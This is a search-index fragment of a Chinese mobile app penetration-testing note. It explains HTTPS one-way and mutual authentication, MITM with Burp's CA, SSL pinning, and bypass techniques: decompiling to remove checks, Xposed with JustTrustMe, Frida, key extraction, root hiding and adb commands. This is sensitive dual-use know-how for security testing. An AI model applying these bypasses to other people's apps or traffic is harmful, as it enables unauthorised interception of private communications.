Xposed\u6846\u67b6\u662f\u4e00\u6b3e\u5f00\u6e90\u6846\u67b6\uff0c\u5176\u529f\u80fd\u662f\u53ef\u4ee5\u5728\u4e0d\u4fee\u6539APK\u7684\u60c5\u51b5\u4e0b\u5f71\u54cd\u7a0b\u5e8f\u8fd0\u884c(\u4fee\u6539\u7cfb\u7edf)\u7684\u6846\u67b6\u670d\u52a1\uff0c\u57fa\u4e8e\u5b83\u53ef\u4ee5\u5236\u4f5c\u51fa\u8bb8\u591a\u529f\u80fd\u5f3a\u5927\u7684\u6a21\u5757\uff0c\u4e14\u5728\u529f\u80fd\u4e0d\u51b2\u7a81\u7684\u60c5\u51b5\u4e0b\u540c\u65f6\u8fd0\u4f5c\u3002Xposed \u5c31\u597d\u6bd4\u662f Google \u6a21\u5757\u5316\u624b\u673a\u7684\u4e3b\u4f53\uff0c\u53ea\u662f\u4e00\u4e2a\u6846\u67b6\u7684\u5b58\u5728\uff0c\u5728\u6dfb\u52a0\u5176\u4ed6\u529f\u80fd\u6a21\u5757(Modules)\u4e4b\u524d\uff0c\u53d1\u6325\u4e0d\u4e86\u4ec0\u4e48\u4f5c\u7528\uff0c\u4f46\u662f\u6ca1\u4e86\u5b83\u4e5f\u4e0d\u884c\u3002\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0cXposed \u5177\u6709\u6bd4\u8f83\u9ad8\u7684\u53ef\u5b9a\u5236\u5316\u7a0b\u5ea6\u3002Moto X \u7528\u6237\u53ef\u5b9a\u5236\u624b\u673a\u7684\u5916\u89c2\u3001\u58c1\u7eb8\u3001\u5f00\u673a\u52a8\u753b\u7b49\uff0cXposed \u5219\u5141\u8bb8\u7528\u6237\u81ea\u9009\u6a21\u5757\u5bf9\u624b\u673a\u529f\u80fd\u8fdb\u884c\u81ea\u5b9a\u4e49\u6269\u5145\u3002 JustTrustMe\uff1a https://github.com/Fuzion24/JustTrustMe/releases JustTrustMe \u4e00\u4e2a\u7528\u6765\u7981\u7528\u3001\u7ed5\u8fc7 SSL \u8bc1\u4e66\u68c0\u67e5\u7684\u57fa\u4e8e Xposed \u6a21\u5757\u3002\u7b80\u5355\u6765\u8bf4\uff0cJustTrustMe \u662f\u5c06 APK \u4e2d\u6240\u6709\u7528\u4e8e\u6821\u9a8c SSL \u8bc1\u4e66\u7684 API \u90fd\u8fdb\u884c\u4e86 Hook\uff0c\u4ece\u800c\u7ed5\u8fc7\u8bc1\u4e66\u68c0\u67e5 3.Frida\u7ed5\u8fc7\uff08\u9700root\uff09 \u53cc\u5411\u8ba4\u8bc1 \u53cc\u5411\u8ba4\u8bc1\u6bd4\u8d77\u5355\u5411\u8ba4\u8bc1\uff0c\u591a\u4e86\u670d\u52a1\u7aef\u6821\u9a8c\u5ba2\u6237\u7aef\u7684\u6b65\u9aa4\u3002\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u6bd4\u8f83\u5c11\uff0c\u56e0\u4e3a\u5b83\u7684\u5b89\u5168\u6027\u4e0essl pining\u4e00\u81f4\u4f46\u662f\u6d88\u8017\u7684\u8ba1\u7b97\u673a\u8d44\u6e90\u66f4\u591a\u3002 \u7ed5\u8fc7\u65b9\u6cd5\u5927\u81f4\u6709\u4e24\u79cd \u00b7\u53cd\u7f16\u8bd1APP\uff0c\u627e\u5230\u8bc1\u4e66\u7684\u79c1\u94a5 \u00b7 HOOK APP\u5bf9\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\u7684\u5730\u65b9\uff0c\u76f4\u63a5\u83b7\u5f97\u660e\u6587 \u6293\u5305\u5b9e\u64cd \u5b89\u53537\u4ee5\u4e0b\u7248\u672c \u5b89\u53537\u4ee5\u4e0a\u7248\u672c \u5728\u5b89\u53537\u4ee5\u4e0a\u7684\u7248\u672c\uff0c\u5b89\u5353\u53ea\u4fe1\u4efb\u6839CA\u4e86\uff0c\u800c\u5728\u8001\u7248\u672c\u4e2d\u53ef\u4ee5\u4fe1\u4efb\u7528\u6237CA\u3002\u800c\u52a0\u5165\u6839CA\u9700\u8981root\u6743\u9650\uff0c \u68c0\u6d4b\u4ee3\u7406\u529f\u80fd root\u9690\u85cf ios\u6293\u5305 \u6709\u4e9b\u7a0b\u5e8f\u53ea\u652f\u6301ios\u3002 mac\u6293\u5305 mac\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5ios\u7684app\u3002(\u53ea\u80fdm\u82af\u7247\uff09 \u5b89\u88c5\u540e\u901a\u8fc7proxifier\u6216\u8005clash\u8bbe\u7f6e\u4ee3\u7406\u5373\u53ef\u5b8c\u6210\u6293\u5305\uff0c\u723d\u7684\u4e00\u3002\u800c\u4e14ios\u7aef\u7684app\u9632\u62a4\u5565\u7684\u90fd\u4e0d\u5982\u5b89\u5353\uff0c\u53ef\u4ee5\u8bf4\u662f\u5f88\u9e21\u513f\u723d\u3002 adb\u4f7f\u7528 adb\u53ef\u4ee5\u8fde\u63a5\u5b89\u5353\u7684shell\uff0c\u5f88\u597d\u7528\u3002 \u8fdc\u7a0b\u8fde\u63a5 \u5148\u63d2\u4e0ausb adb devices \u67e5\u770b\u662f\u5426\u8fde\u63a5\u4e0a adb tcpip 5555 \u5f00\u542f\u624b\u673a5555\u8c03\u8bd5\u7aef\u53e3 adb connect ip:port \u8fde\u63a5\u624b\u673a\u8c03\u8bd5\u7aef\u53e3 adb shell \u8fdbshell \u8fdc\u7a0b\u5b89\u88c5apk adb logcat \u5f00\u542flogcat adb install -r ~/Downloads/TPLAppPersonInsuAdrPhone.2.4.4.1100.apk","title":"APP\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#app","text":"","title":"APP\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_1","text":"\u6293\u5305 \u5355\u5411\u8ba4\u8bc1 SSL pining \u53cc\u5411\u8ba4\u8bc1 \u6293\u5305\u5b9e\u64cd \u5b89\u53537\u4ee5\u4e0b\u7248\u672c \u5b89\u53537\u4ee5\u4e0a\u7248\u672c \u68c0\u6d4b\u4ee3\u7406\u529f\u80fd root\u9690\u85cf ios\u6293\u5305 mac\u6293\u5305 adb\u4f7f\u7528 \u5bf9\u6297\u5927\u81f4\u6709\u8fd9\u51e0\u7c7b \u00b7\u65e0\u9632\u8303\u63aa\u65bd\uff0c\u76f4\u63a5\u4e0aburp\uff0c\u628aCA\u8bc1\u4e66\u88c5\u597d\u5c31\u53ef\u4ee5\u6293\u5305\u4e86\uff08\u4ec5\u91c7\u7528\u5355\u5411\u8ba4\u8bc1\uff0c\u6216\u8005\u6839\u672c\u5c31\u6ca1\u6709\u8bc1\u4e66\u9a8c\u8bc1\u529f\u80fd\uff09 \u00b7 \u91c7\u7528ssl pining\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7 \u4f7f\u7528\u53cc\u5411\u8ba4\u8bc1\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7\u68c0\u6d4b\u6a21\u62df\u5668\uff0c\u4ee5\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305 \u00b7\u68c0\u6d4b\u662f\u5426\u542f\u7528\u4e86\u4ee3\u7406\uff0c\u6765\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305\uff08\u4f60\u6293\u5305\u80af\u5b9a\u8981\u8d70\u4ee3\u7406\u662f\u5427\uff09 \u00b7\u68c0\u6d4b\u662f\u5426root\u8fc7\uff0croot\u8fc7\u5c31\u95ea\u9000\uff0c\u6765\u9632\u8303\u4e2d\u95f4\u4eba\u6293\u5305","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_2","text":"\u5305\u90fd\u6293\u4e0d\u4e86\uff0c\u8c08\u4f55\u6e17\u900f\u3002 app\u6293\u5305\u4f1a\u9047\u5230\u5927\u81f4\u4e0b\u5217\u8ba4\u8bc1\u65b9\u5f0f\u3002\u6211\u4eec\u4e00\u4e00\u8ba8\u8bba","title":"\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_3","text":"\u5355\u5411\u8ba4\u8bc1\u662fHTTPS\u4e2d\uff0c\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u7aef\u8fdb\u884c\u8eab\u4efd\u6821\u9a8c\u7684\u4e00\u4e2a\u73af\u8282\u3002 \u4f46\u662f\u8fd9\u4e2a\u8eab\u4efd\u6821\u9a8c\u53ef\u4ee5\u88ab\u8f7b\u800c\u6613\u4e3e\u7684\u7ed5\u8fc7\uff0c\u5982\u679c\u76ee\u6807APP\u4ec5\u4f7f\u7528\u4e86\u5355\u5411\u8ba4\u8bc1\u800c\u6ca1\u6709\u989d\u5916\u542f\u7528SSL pining\u9632\u62a4\u7684\u8bdd\uff0c\u90a3\u5c31\u7b49\u540c\u4e8e\u6ca1\u6709\u9632\u8303\u63aa\u65bd\uff0c\u76f4\u63a5\u628aburp\u751f\u6210\u7684CA\u8bc1\u4e66\u5728\u624b\u673a\u91cc\u88c5\u597d\u5c31\u53ef\u4ee5\u6293\u5b83\u7684\u5305\u4e86\u3002 \u4e0a\u56fe\u662fHTTPS\u5355\u5411\u8ba4\u8bc1\u7684\u4e00\u4e2a\u6d41\u7a0b\u56fe\uff0c\u53ef\u4ee5\u53d1\u73b0\u53ea\u505a\u4e86\u5ba2\u6237\u7aef\u5bf9\u670d\u52a1\u7aef\u7684\u6821\u9a8c\u3002 \u90a3\u4e48burp\u662f\u5982\u4f55\u7ed5\u8fc7\u5355\u5411\u8ba4\u8bc1\u8fdb\u884c\u6293\u5305\u7684\u5462\uff1f\u7b54\u6848\u5728\u4e8eburp\u751f\u6210\u7684\u90a3\u5f20CA\u8bc1\u4e66\u3002 \u5728\u4e86\u89e3\u5355\u5411\u8ba4\u8bc1\u4e4b\u524d\uff0c\u6211\u4e00\u76f4\u4e0d\u4e86\u89e3\u4e3a\u4ec0\u4e48\u4f7f\u7528burp\u6293\u5305\u7684\u65f6\u5019\u8981\u4e13\u95e8\u5728\u6d4f\u89c8\u5668\u4e2d\u5b89\u88c5\u4e00\u4e2aCA\u8bc1\u4e66\uff0c\u73b0\u5728\u77e5\u9053\u539f\u56e0\u4e86\uff1aBurp\u751f\u6210\u7684CA\u8bc1\u4e66\u662f\u4f2a\u9020\u51fa\u6765\u7ed9\u5ba2\u6237\u7aef\uff08\u6d4f\u89c8\u5668\u3001APP\uff09\u770b\u7684\uff0c\u51c6\u786e\u6765\u8bf4\u751f\u6210\u7684\u662fCA\u8bc1\u4e66\u7684\u6839\u8bc1\u4e66\uff0c\u5176\u5305\u542b\u516c\u94a5\u3001\u6563\u5217\u503c\u7b49\u4fe1\u606f\uff0c\u516c\u94a5\u7528\u6765\u89e3\u5bc6\u4f5c\u4e3a\u4e2d\u95f4\u4eba\u7684burp\u53d1\u6765\u7684CA\u8bc1\u4e66\uff0c\u83b7\u53d6B_\u516c\u94a5\uff08CA\u8bc1\u4e66\u4f7f\u7528\u79c1\u94a5\u52a0\u5bc6\uff0c\u516c\u94a5\u89e3\u5bc6\uff09\uff0c\u8fd9\u4e00\u6b65\u5bf9\u5e94\u7740\u4e0a\u56fe\u4e2d\u7684\u201c\u81ea\u5df1\u5148\u64cd\u4f5c\u4e00\u6ce2\u201d\u7684\u5185\u5bb9\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u89e3\u5bc6\u540e\u7684\u5185\u5bb9\u7684\u6563\u5217\u503c\u4e5f\u4f1a\u4e0e\u516c\u94a5\u9644\u5e26\u7684\u6563\u5217\u503c\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5224\u65ad\u8bc1\u4e66\u662f\u5426\u4e00\u81f4\u3002 \u4e2d\u95f4\u4eba\u5e76\u4e0d\u4f1a\u628a\u670d\u52a1\u7aef\u8fd4\u56de\u7684\u8bc1\u4e66\u539f\u5c01\u4e0d\u52a8\u7684\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff08\u56e0\u4e3a\u5982\u679c\u539f\u5c01\u4e0d\u52a8\u7684\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u540e\u7eed\u5ba2\u6237\u7aef\u7528\u8bc1\u4e66\u83b7\u53d6\u7684\u516c\u94a5\u6765\u52a0\u5bc6\u7684\u5bc6\u94a5F\u5bf9\u4e8e\u4e2d\u95f4\u4eba\u6765\u8bf4\u5c31\u662f\u672a\u77e5\u7684\u4e86\uff0c\u56e0\u4e3a\u4e2d\u95f4\u4eba\u6ca1\u6709\u8bc1\u4e66\u5bf9\u5e94\u7684\u79c1\u94a5\u89e3\u5bc6\u83b7\u53d6\u5bc6\u94a5F\uff09\uff0c\u800c\u662f\u81ea\u5df1\u751f\u6210\u4e00\u5f20\u65b0\u7684\u4f2a\u9020\u7684\u8bc1\u4e66\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u56e0\u4e3a\u8bc1\u4e66\u662f\u81ea\u5df1\u751f\u6210\u7684\uff0c\u6240\u4ee5\u77e5\u9053\u8be5\u8bc1\u4e66\u7684\u79c1\u94a5\uff0c\u4ece\u800c\u89e3\u5bc6\u83b7\u5f97\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u5bc6\u94a5F\uff0c\u4ece\u800c\u622a\u83b7\u5ba2\u6237\u7aef\u53d1\u51fa\u6765\u7684\u8bf7\u6c42\u3002 \u800c\u7531\u4e8e\u670d\u52a1\u7aef\u5bf9\u5ba2\u6237\u7aef\u5e76\u6ca1\u6709\u8bc1\u4e66\u6821\u9a8c\u8fd9\u4e2a\u73af\u8282\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u4e2d\u95f4\u4eba\u4e0d\u9700\u8981\u63d0\u4f9b\u4efb\u4f55\u51ed\u8bc1\uff0c\u53ea\u9700\u8981\u7eaf\u7eaf\u7684\u6a21\u62df\u5ba2\u6237\u7aef\u7684\u884c\u4e3a\u5373\u53ef\u3002 \u968f\u540e\u4e2d\u95f4\u4eba\u5c31\u83b7\u5f97\u4e86 \u5ba2\u6237\u7aef-\u4e2d\u95f4\u4eba\u7684\u5bc6\u94a5F1\uff0c\u670d\u52a1\u7aef-\u4e2d\u95f4\u4eba\u7684\u5bc6\u94a5F2\uff0c\u7136\u540e\u53ea\u9700\u628a\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u6570\u636e\u7528F1\u89e3\u5bc6\uff0c\u7136\u540e\u7528F2\u52a0\u5bc6\u53d1\u9001\u7ed9\u670d\u52a1\u7aef\uff0c\u628a\u670d\u52a1\u7aef\u53d1\u6765\u7684\u6570\u636e\u7528F2\u89e3\u5bc6\uff0cF1\u52a0\u5bc6\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u5373\u53ef\uff0c\u4e2d\u95f4\u8fd8\u53ef\u4ee5\u7be1\u6539\u6d88\u606f\u5185\u5bb9\uff0c\u5b9e\u73b0\u4e2d\u95f4\u4eba\u653b\u51fb\uff0c\u4e5f\u5c31\u662f\u8bf4\u5b8c\u6210\u4e86\u6293\u5305\u3002","title":"\u5355\u5411\u8ba4\u8bc1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#ssl-pining","text":"https://owasp.org/www-community/controls/Certificate_and_Public_Key_Pinning \u5382\u5546\u4eec\u81ea\u7136\u4e5f\u4e0d\u662f\u50bb\u5b50\uff0c\u77e5\u9053\u5355\u9760\u5355\u5411\u8ba4\u8bc1\u65e0\u6cd5\u9632\u6b62\u6293\u5305\u540e\uff0c\u5c31\u63a8\u51fa\u4e86\u4e24\u79cd\u9632\u8303\u63aa\u65bd\uff1a\u9488\u5bf9\u5355\u5411\u8ba4\u8bc1\u5b89\u5168\u6027\u7684\u4f18\u5316\u65b9\u6848SSL pining\u548c\u65b0\u7684\u4e00\u5957\u8ba4\u8bc1\u6a21\u5f0f\u53cc\u5411\u8ba4\u8bc1\u3002\u8fd9\u91cc\u5c31\u5148\u8bf4\u8bf4SSL pining\u8fd9\u4e2a\u4f7f\u7528\u5e7f\u6cdb\u4e00\u70b9\u7684\u4fdd\u62a4\u63aa\u65bd\u3002 ssl pining\u662f\u7528\u4e8e\u9632\u8303\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u6280\u672f\uff0c\u88ab\u7528\u4e8eHTTPS\u4e2d\u3002 \u53ef\u4ee5\u770b\u4f5c\u662f\u4e3a\u5355\u5411\u8ba4\u8bc1\u6253\u9020\u7684\u4e00\u5957\u9632\u8303\u4e2d\u95f4\u4eba\u653b\u51fb\u7684\u63aa\u65bd\u3002\u5b83\u7684\u6838\u5fc3\u601d\u60f3\u662f\u628a\u670d\u52a1\u7aef\u8bc1\u4e66\u7684\u5173\u952e\u4fe1\u606f\u5199\u5165\u4ee3\u7801\u5c42\uff0c\u5de5\u4f5c\u65f6\u89e3\u5bc6\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\uff0c\u5c06\u5176\u4e0e\u4ee3\u7801\u5c42\u5199\u6b7b\u7684\u7edd\u5bf9\u771f\u5b9e\u7684\u670d\u52a1\u7aef\u8bc1\u4e66\u7684\u5173\u952e\u4fe1\u606f\u8fdb\u884c\u6bd4\u5bf9\uff0c\u4ece\u800c\u5224\u65ad\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u662f\u5426\u662f\u4f2a\u9020\u7684\u3002 SSL pining\u7ec6\u5206\u4e3a\u4e24\u79cd\uff0c\u5206\u522b\u662f \u8bc1\u4e66\u9501\u5b9a\uff08Certificate Pinning\uff09\u548c\u516c\u94a5\u9501\u5b9a\uff08Public Key Pinning\uff09 \u6240\u8c13\u8bc1\u4e66\u9501\u5b9a\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\uff08APP\uff09\u4ee3\u7801\u5c42\u5199\u6b7b\u4e86\u6240\u80fd\u63a5\u53d7\u7684\u8bc1\u4e66\u7684\u6563\u5217\u503c\uff0c\u5982\u679c\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u7684\u6563\u5217\u503c\u4e0e\u5176\u4e0d\u4e00\u81f4\uff0c\u5219\u4f7f\u672c\u6b21\u901a\u8baf\u8ba4\u8bc1\u5931\u8d25\u3002\u503c\u5f97\u4e00\u63d0\u7684\u662f\u8bc1\u4e66\u9501\u5b9a\u5728\u8bc1\u4e66\u9700\u8981\u7ecf\u5e38\u66f4\u6362\u7684\u60c5\u51b5\u4e0b\uff0c\u90a3\u4e48\u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u4e5f\u9700\u8981\u8ddf\u7740\u66f4\u65b0\u5185\u90e8\u4ee3\u7801\u4e2d\u8bc1\u4e66\u7684\u6563\u5217\u503c\u3002 \u6240\u8c13\u516c\u94a5\u9501\u5b9a\uff0c\u5c31\u662f\u5ba2\u6237\u7aef\uff08APP\uff09\u4ee3\u7801\u5c42\u5199\u6b7b\u4e86\u8bc1\u4e66\u89e3\u5f00\u540e\u7684\u516c\u94a5\uff0c\u7136\u540e\u4e0e\u670d\u52a1\u7aef\u53d1\u6765\u7684\u8bc1\u4e66\u89e3\u5f00\u540e\u7684\u516c\u94a5\u8fdb\u884c\u6bd4\u5bf9\uff0c\u5224\u65ad\u662f\u5426\u4e00\u81f4\u3002 \u8fd9\u6837\u770b\u6765\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528SSL pining\u540e\u8fd8\u4f1a\u68c0\u9a8c\u8bc1\u4e66\uff0c\u6211\u4eec\u4f2a\u9020\u4e00\u4e2aCA\u8bc1\u4e66\u7ed9\u5ba2\u6237\u7aef\u7684\u65b9\u6848\u4f3c\u4e4e\u884c\u4e0d\u901a\u4e86\uff0c\u90a3\u600e\u4e48\u7ed5\u8fc7\u5462\uff1f \u7ed5\u8fc7\u65b9\u6848 1.\u53cd\u7f16\u8bd1\u5254\u9664\u6821\u9a8c\u4ee3\u7801 \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u53cd\u7f16\u8bd1\u76ee\u6807APK\uff0c\u7136\u540e\u5254\u9664\u6821\u9a8c\u8bc1\u4e66\u7684\u4ee3\u7801\uff0c\u518d\u91cd\u65b0\u7f16\u8bd1\u6210apk\u3002\u524d\u63d0\u6761\u4ef6\u662f\u76ee\u6807APP\u6ca1\u6709\u5b8c\u6574\u6027\u68c0\u67e5. \u4ee3\u7801\u5173\u952e\u5b57\uff1acheckserver\u3001certification\u3002certificate\u3001X509 2.Xposed\u6846\u67b6+JustTrustMe\uff08\u9700root\uff09 Xposed\u6846\u67b6\u662f\u4e00\u6b3e\u5f00\u6e90\u6846\u67b6\uff0c\u5176\u529f\u80fd\u662f\u53ef\u4ee5\u5728\u4e0d\u4fee\u6539APK\u7684\u60c5\u51b5\u4e0b\u5f71\u54cd\u7a0b\u5e8f\u8fd0\u884c(\u4fee\u6539\u7cfb\u7edf)\u7684\u6846\u67b6\u670d\u52a1\uff0c\u57fa\u4e8e\u5b83\u53ef\u4ee5\u5236\u4f5c\u51fa\u8bb8\u591a\u529f\u80fd\u5f3a\u5927\u7684\u6a21\u5757\uff0c\u4e14\u5728\u529f\u80fd\u4e0d\u51b2\u7a81\u7684\u60c5\u51b5\u4e0b\u540c\u65f6\u8fd0\u4f5c\u3002Xposed \u5c31\u597d\u6bd4\u662f Google \u6a21\u5757\u5316\u624b\u673a\u7684\u4e3b\u4f53\uff0c\u53ea\u662f\u4e00\u4e2a\u6846\u67b6\u7684\u5b58\u5728\uff0c\u5728\u6dfb\u52a0\u5176\u4ed6\u529f\u80fd\u6a21\u5757(Modules)\u4e4b\u524d\uff0c\u53d1\u6325\u4e0d\u4e86\u4ec0\u4e48\u4f5c\u7528\uff0c\u4f46\u662f\u6ca1\u4e86\u5b83\u4e5f\u4e0d\u884c\u3002\u4e5f\u6b63\u56e0\u4e3a\u5982\u6b64\uff0cXposed \u5177\u6709\u6bd4\u8f83\u9ad8\u7684\u53ef\u5b9a\u5236\u5316\u7a0b\u5ea6\u3002Moto X \u7528\u6237\u53ef\u5b9a\u5236\u624b\u673a\u7684\u5916\u89c2\u3001\u58c1\u7eb8\u3001\u5f00\u673a\u52a8\u753b\u7b49\uff0cXposed \u5219\u5141\u8bb8\u7528\u6237\u81ea\u9009\u6a21\u5757\u5bf9\u624b\u673a\u529f\u80fd\u8fdb\u884c\u81ea\u5b9a\u4e49\u6269\u5145\u3002 JustTrustMe\uff1a https://github.com/Fuzion24/JustTrustMe/releases JustTrustMe \u4e00\u4e2a\u7528\u6765\u7981\u7528\u3001\u7ed5\u8fc7 SSL \u8bc1\u4e66\u68c0\u67e5\u7684\u57fa\u4e8e Xposed \u6a21\u5757\u3002\u7b80\u5355\u6765\u8bf4\uff0cJustTrustMe \u662f\u5c06 APK \u4e2d\u6240\u6709\u7528\u4e8e\u6821\u9a8c SSL \u8bc1\u4e66\u7684 API \u90fd\u8fdb\u884c\u4e86 Hook\uff0c\u4ece\u800c\u7ed5\u8fc7\u8bc1\u4e66\u68c0\u67e5 3.Frida\u7ed5\u8fc7\uff08\u9700root\uff09","title":"SSL pining"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_4","text":"\u53cc\u5411\u8ba4\u8bc1\u6bd4\u8d77\u5355\u5411\u8ba4\u8bc1\uff0c\u591a\u4e86\u670d\u52a1\u7aef\u6821\u9a8c\u5ba2\u6237\u7aef\u7684\u6b65\u9aa4\u3002\u8fd9\u79cd\u60c5\u51b5\uff0c\u4e00\u822c\u6bd4\u8f83\u5c11\uff0c\u56e0\u4e3a\u5b83\u7684\u5b89\u5168\u6027\u4e0essl pining\u4e00\u81f4\u4f46\u662f\u6d88\u8017\u7684\u8ba1\u7b97\u673a\u8d44\u6e90\u66f4\u591a\u3002 \u7ed5\u8fc7\u65b9\u6cd5\u5927\u81f4\u6709\u4e24\u79cd \u00b7\u53cd\u7f16\u8bd1APP\uff0c\u627e\u5230\u8bc1\u4e66\u7684\u79c1\u94a5 \u00b7 HOOK APP\u5bf9\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\u7684\u5730\u65b9\uff0c\u76f4\u63a5\u83b7\u5f97\u660e\u6587","title":"\u53cc\u5411\u8ba4\u8bc1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_5","text":"","title":"\u6293\u5305\u5b9e\u64cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#7","text":"","title":"\u5b89\u53537\u4ee5\u4e0b\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#7_1","text":"\u5728\u5b89\u53537\u4ee5\u4e0a\u7684\u7248\u672c\uff0c\u5b89\u5353\u53ea\u4fe1\u4efb\u6839CA\u4e86\uff0c\u800c\u5728\u8001\u7248\u672c\u4e2d\u53ef\u4ee5\u4fe1\u4efb\u7528\u6237CA\u3002\u800c\u52a0\u5165\u6839CA\u9700\u8981root\u6743\u9650\uff0c","title":"\u5b89\u53537\u4ee5\u4e0a\u7248\u672c"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#_6","text":"","title":"\u68c0\u6d4b\u4ee3\u7406\u529f\u80fd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#root","text":"","title":"root\u9690\u85cf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#ios","text":"\u6709\u4e9b\u7a0b\u5e8f\u53ea\u652f\u6301ios\u3002","title":"ios\u6293\u5305"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E7%A7%BB%E5%8A%A8%E7%AB%AF/APP%E6%B8%97%E9%80%8F/APP%E6%B8%97%E9%80%8F/#mac","text":"mac\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5ios\u7684app\u3002(\u53ea\u80fdm\u82af\u7247\uff09 